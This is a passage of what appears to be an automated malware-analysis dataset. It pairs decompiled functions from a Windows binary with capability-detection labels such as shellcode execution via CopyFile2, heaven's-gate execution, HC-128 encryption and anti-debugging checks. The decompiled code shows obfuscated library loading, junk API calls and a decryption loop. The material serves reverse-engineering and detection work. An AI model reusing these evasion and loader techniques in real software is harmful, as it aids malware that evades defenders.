WARNING: Removing unreachable block (ram,0x0040f9b2)\n// WARNING: Removing unreachable block (ram,0x0040f83d)\n// WARNING: Removing unreachable block (ram,0x0040f81a)\n// WARNING: Removing unreachable block (ram,0x0040fa10)\n// WARNING: Removing unreachable block (ram,0x0040f756)\n// WARNING: Removing unreachable block (ram,0x0040fa1a)\n// WARNING: Removing unreachable block (ram,0x0040fa5b)\n// WARNING: Variable defined which should be unmapped: var_7ch\n\nvoid __cdecl\nfcn.0040f3b9(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.004066c4();\n        *puVar2 = 0x16;\n        fcn.0040665c(0, 0, 0, 0, 0);\n        fcn.0040612b(var_7ch);\n        return;\n    }\n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x0040f44c. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x40fa81\n    (**0x40fa81)();\n    return;\n}\n",
        "token_count": 1892
    },
    "00404c44": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404c44(uint32_t arg_8h)\n\n{\n    fcn.00404c25();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040558d();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00404c8d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404c8d(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x401218;\n    fcn.00404c25();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040558d();\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00404cdc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404cdc(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x401224;\n    fcn.00404c25();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040558d();\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "0040518c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040518c(uint32_t arg_8h)\n\n{\n    fcn.00405169();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040558d();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "004056cb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004056cb(uint32_t arg_8h)\n\n{\n    fcn.004056bb();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040558d();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "004032b0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.004032b0(void)\n\n{\n    *0x2f55c1a = 0x6c;\n    *0x2f55c0e = 0x6d;\n    *0x2f55c0c = 0x69;\n    *0x2f55c10 = 0x67;\n    *0x2f55c18 = 100;\n    *0x2f55c1e = 0;\n    *0x2f55c12 = 0x33;\n    *0x2f55c0a = 0x73;\n    *0x2f55c1c = 0x6c;\n    *0x2f55c16 = 0x2e;\n    *0x2f55c14 = 0x32;\n    *0x2f55c08 = 0x6d;\n    (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x2f55c08);\n    return;\n}\n",
        "token_count": 224
    },
    "004033f0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.004033f0(uint32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uStack572;\n    uchar auStack552 [4];\n    uchar auStack548 [4];\n    uchar auStack544 [536];\n    uint32_t *puStack8;\n    \n    uVar2 = *param_1;\n    uVar3 = param_1[1];\n    fcn.004033d0();\n    uStack572 = uVar2;\n    iVar1 = *0x7fc170;\n    if (*0x2f55c04 == 0x14) {\n        (*_sym.imp.KERNEL32.dll_GetCPInfoExW)(0, 0, auStack544);\n        iVar1 = *0x7fc170;\n    }\n    do {\n        if (*0x2f55c04 == 0xfa9) {\n            *0x2f55c00 = 0xedeb2e40;\n        }\n        else if (*0x2f55c04 == 0x3eb) {\n            *0x2f55b74 = 0;\n        }\n        *0x2f55bfc = 0xf4ea3dee;\n        fcn.004033e0();\n        if (*0x2f55c04 == 0x9e6) {\n            (*_sym.imp.KERNEL32.dll_GetProcessPriorityBoost)(0, auStack552);\n        }\n        uVar3 = uVar3 - (uVar2 >> 5 ^ uVar2 * 0x10 + iVar1 ^ uStack572 + 0x23f);\n        if (*0x2f55c04 == 0xc) {\n            (*_sym.imp.KERNEL32.dll_WriteConsoleA)(0, 0, 0, auStack548, 0);\n        }\n        fcn.00403350();\n        fcn.00403360();\n        uVar2 = uVar2 - unaff_ESI;\n        uStack572 = uVar3;\n    } while (uVar3 != 0xfffffdc2);\n    puStack8[1] = 0xfffffdc2;\n    *puStack8 = uVar2;\n    return;\n}\n",
        "token_count": 504
    },
    "004035b0": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.004035b0(void)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint32_t uVar6;\n    \n    fcn.0040e8a0();\n    pcVar5 = _sym.imp.KERNEL32.dll_LoadLibraryA;\n    pcVar4 = _sym.imp.KERNEL32.dll_WriteProfileSectionA;\n    pcVar3 = _sym.imp.KERNEL32.dll_FindNextVolumeW;\n    pcVar2 = _sym.imp.KERNEL32.dll_SetHandleCount;\n    uVar6 = *0x2f55b78;\n    uVar1 = *0x2f55c04 >> 3;\n    while (uVar1 != 0) {\n        if (*0x2f55c04 == 0x959) {\n            (*pcVar2)();\n            (*pcVar3)();\n            (*pcVar4)();\n            (*pcVar5)();\n            (*_sym.imp.KERNEL32.dll_EnumCalendarInfoExA)();\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasW)();\n            (*_sym.imp.KERNEL32.dll_AddConsoleAliasW)();\n            (*pcVar4)();\n            (*_sym.imp.KERNEL32.dll_EnumResourceTypesA)();\n            (*_sym.imp.KERNEL32.dll_SetThreadPriorityBoost)();\n            (*_sym.imp.KERNEL32.dll_GetConsoleTitleW)();\n            (*_sym.imp.KERNEL32.dll_BeginUpdateResourceW)();\n            (*pcVar4)();\n            (*_sym.imp.KERNEL32.dll_FindResourceExA)();\n        }\n        fcn.004033f0();\n        uVar6 = uVar6 - 1;\n        uVar1 = uVar6;\n    }\n    return;\n}\n",
        "token_count": 382
    },
    "004033d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004033d0(void)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + -0x3910cb1f;\n    return;\n}\n",
        "token_count": 46
    },
    "004033e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004033e0(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + param_1;\n    return;\n}\n",
        "token_count": 48
    },
    "004036d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004036d0(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "00403710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "PEB access",
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d",
            "contain loop",
            "get OS version",
            "get common file path",
            "allocate thread local storage",
            "resolve function by parsing PE exports",
            "set thread local storage value"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00404510": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.00404510(void)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint32_t **ppuVar3;\n    uint32_t **ppuVar4;\n    int32_t unaff_ESI;\n    \n    uVar1 = *(unaff_ESI + 0x18);\n    ppuVar4 = unaff_ESI + 4;\n    ppuVar3 = ppuVar4;\n    if (7 < uVar1) {\n        ppuVar3 = *ppuVar4;\n    }\n    if (ppuVar3 < 0x402e31) {\n        ppuVar3 = ppuVar4;\n        if (7 < uVar1) {\n            ppuVar3 = *ppuVar4;\n        }\n        if (0x402e30 < ppuVar3 + *(unaff_ESI + 0x14) * 2) {\n            if (7 < uVar1) {\n                ppuVar4 = *ppuVar4;\n            }\n            fcn.004045b0(0x402e30 - ppuVar4 >> 1);\n            return;\n        }\n    }\n    cVar2 = fcn.00404660();\n    if (cVar2 != '\\0') {\n        ppuVar3 = ppuVar4;\n        if (7 < *(unaff_ESI + 0x18)) {\n            ppuVar3 = *ppuVar4;\n        }\n        fcn.0040563e(ppuVar3, *(unaff_ESI + 0x18) * 2, 0x402e30, in_EAX * 2);\n        *(unaff_ESI + 0x14) = in_EAX;\n        if (7 < *(unaff_ESI + 0x18)) {\n            ppuVar4 = *ppuVar4;\n        }\n        *(ppuVar4 + in_EAX * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 442
    },
    "004045b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004045b0(int32_t param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t *arg_8h;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    \n    if (*(in_EAX + 0x14) < param_2) {\n        fcn.00404e4f();\n    }\n    uVar4 = *(in_EAX + 0x14) - param_2;\n    if (param_3 < uVar4) {\n        uVar4 = param_3;\n    }\n    if (param_1 != in_EAX) {\n        cVar1 = fcn.00404660();\n        if (cVar1 != '\\0') {\n            if (*(in_EAX + 0x18) < 8) {\n                iVar2 = in_EAX + 4;\n            }\n            else {\n                iVar2 = *(in_EAX + 4);\n            }\n            piVar3 = param_1 + 4;\n            arg_8h = piVar3;\n            if (7 < *(param_1 + 0x18)) {\n                arg_8h = *piVar3;\n            }\n            fcn.0040563e(arg_8h, *(param_1 + 0x18) * 2, iVar2 + param_2 * 2, uVar4 * 2);\n            *(param_1 + 0x14) = uVar4;\n            if (7 < *(param_1 + 0x18)) {\n                piVar3 = *piVar3;\n            }\n            *(uVar4 * 2 + piVar3) = 0;\n        }\n        return param_1;\n    }\n    fcn.004046c0();\n    fcn.004046c0();\n    return param_1;\n}\n",
        "token_count": 431
    },
    "00404660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00404660(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7, \n                 uint param_8, uint param_9, uint param_10, uint param_11, uint param_12)\n\n{\n    int32_t in_EAX;\n    uint unaff_ESI;\n    uint32_t unaff_EDI;\n    uint unaff_retaddr;\n    \n    if (0x7ffffffe < unaff_EDI) {\n        fcn.00404d03();\n    }\n    if (*(in_EAX + 0x18) < unaff_EDI) {\n        fcn.00404750(in_EAX, unaff_EDI, *(in_EAX + 0x14), unaff_ESI, unaff_retaddr, param_1, param_2, param_3, param_4, \n                     param_5, param_6, param_7, param_8, param_9, param_10, param_11, param_12);\n        return unaff_EDI != 0;\n    }\n    if (unaff_EDI == 0) {\n        *(in_EAX + 0x14) = 0;\n        if (7 < *(in_EAX + 0x18)) {\n            **(in_EAX + 4) = 0;\n            return false;\n        }\n        *(in_EAX + 4) = 0;\n    }\n    return unaff_EDI != 0;\n}\n",
        "token_count": 335
    },
    "004046c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.004046c0(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    uint *puVar3;\n    int32_t unaff_ESI;\n    uint *puStack8;\n    uint *puStack4;\n    \n    if (*(unaff_ESI + 0x14) < unaff_EBX) {\n        fcn.00404e4f();\n    }\n    uVar1 = *(unaff_ESI + 0x14) - unaff_EBX;\n    if (uVar1 < in_EAX) {\n        in_EAX = uVar1;\n    }\n    if (in_EAX != 0) {\n        puVar3 = unaff_ESI + 4;\n        puStack8 = puVar3;\n        puStack4 = puVar3;\n        if (7 < *(unaff_ESI + 0x18)) {\n            puStack8 = *puVar3;\n            puStack4 = *puVar3;\n        }\n        fcn.0040502e(puStack4 + unaff_EBX * 2, (*(unaff_ESI + 0x18) - unaff_EBX) * 2, \n                     puStack8 + (unaff_EBX + in_EAX) * 2, (uVar1 - in_EAX) * 2);\n        iVar2 = *(unaff_ESI + 0x14) - in_EAX;\n        *(unaff_ESI + 0x14) = iVar2;\n        if (7 < *(unaff_ESI + 0x18)) {\n            puVar3 = *puVar3;\n        }\n        *(puVar3 + iVar2 * 2) = 0;\n    }\n    return;\n}\n",
        "token_count": 395
    },
    "00404967": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404967(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.0040502e(arg_8h, arg_ch, arg_10h, arg_14h);\n    return arg_8h;\n}\n",
        "token_count": 67
    },
    "00404a02": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404a02(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.00404949(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 63
    },
    "00404a1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404a1d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.00404967(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 64
    },
    "00404a6e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404a6e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_4h;\n    \n    fcn.00404a02(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 73
    },
    "00404a8d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404a8d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_4h;\n    \n    fcn.00404a1d(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 74
    },
    "00404fba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404fba(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0040613a(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    arg_8h_00 = *(unaff_EBP + 8);\n    fcn.0040510c(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    *extraout_ECX = 0x40120c;\n    fcn.00404f8f(arg_8h_00 + 0xc);\n    fcn.004061a3();\n    return;\n}\n",
        "token_count": 199
    },
    "004059ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004059ac(uint arg_8h)\n\n{\n    fcn.00405880(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 39
    },
    "00409496": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004094aa)\n// WARNING: Removing unreachable block (ram,0x004094b0)\n// WARNING: Removing unreachable block (ram,0x004094b2)\n\nvoid fcn.00409496(void)\n\n{\n    return;\n}\n",
        "token_count": 62
    },
    "00405dd2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405dd2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040ae78(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "00409255": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00409255(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004077dc(0x7f9ff8, 0xc);\n    fcn.00406ce2(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x7fec40;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x7fec3c;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x00409299;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0040673f(arg_8h_00);\ncode_r0x00409299:\n        fcn.0040673f(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004092bc();\n    fcn.00407821();\n    return;\n}\n",
        "token_count": 394
    }
}